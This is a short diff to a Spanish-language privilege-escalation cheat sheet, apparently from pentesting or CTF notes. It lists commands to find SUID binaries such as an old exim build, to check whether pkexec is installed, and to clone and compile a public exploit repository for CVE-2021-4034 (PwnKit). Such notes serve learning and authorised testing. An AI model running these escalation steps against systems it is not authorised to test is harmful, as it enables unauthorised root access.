@@ -26,7 +26,6 @@ Por último, se os comparte el enlace de descarga al binario el cual estaremos e
 
 ```bash 
 ❯ find / -perm -4000 2>/dev/null                # Buscar archivos con permisos SUID
-❯ find \-perm -4000 2>/dev/null
 
 	# /usr/exim/bin/exim-4.84-7 = Es un agente de transporte de correo, y puede ser utilizado en la malloria de los sistemas UNIX
 ```
@@ -34,7 +33,8 @@ Por último, se os comparte el enlace de descarga al binario el cual estaremos e
 ## Pkexec 
 
 ```bash 
-❯ https://github.com/berdav/CVE-2021-4034     # Repositorio 
+❯ which pkexec | xargs ls -l        # Mirar si esta instalado el binario 'Pkexec'
+❯ git clone https://github.com/berdav/CVE-2021-4034     # Clonar el repo  
 
 # Ingresar el directorio 
 ❯ make                     # Crear un compilado del binario 
